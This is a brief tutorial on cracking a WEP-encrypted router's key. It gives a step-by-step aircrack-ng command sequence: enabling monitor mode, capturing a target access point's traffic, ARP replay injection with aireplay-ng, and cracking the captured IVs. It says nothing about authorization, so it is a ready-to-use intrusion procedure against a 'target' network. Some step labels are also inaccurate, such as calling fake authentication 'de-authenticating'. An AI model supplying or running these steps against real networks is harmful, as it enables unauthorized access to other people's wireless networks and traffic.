Quick tutorial on how to crack a WEP encrypted router.

This method utilizes the Address Resolution Protocol (ARP) attack.

Required: airmon-ng, airodump-ng, aireplay-ng and aircrack-ng.


1. airmon-ng : Confirm Wlan0 exists (Wireless card/driver is compatible.)
2. airmon-ng start Wlan0 
3. Kill conflicting PIDs

Use airodump to monitor traffic.

4. airodump-ng mon0 : Activate monitor mode.
5. airodump-ng -c "channel" -w "output_file_name" --bssid "target mac address" mon0 : Create file-dump for captured traffic.

Now start the ARP attack.

6. aireplay-ng -1 0 -a "target mac address" mon0 : de-authenticating to the router.
7. aireplay-ng -3 -b "target mac address" mon0 : ARP attack.

When sufficient IVs are collected attempt the aircrack command. Required amount of IVs vary by access point.

8. aircrack-ng "output_file_name.cap"
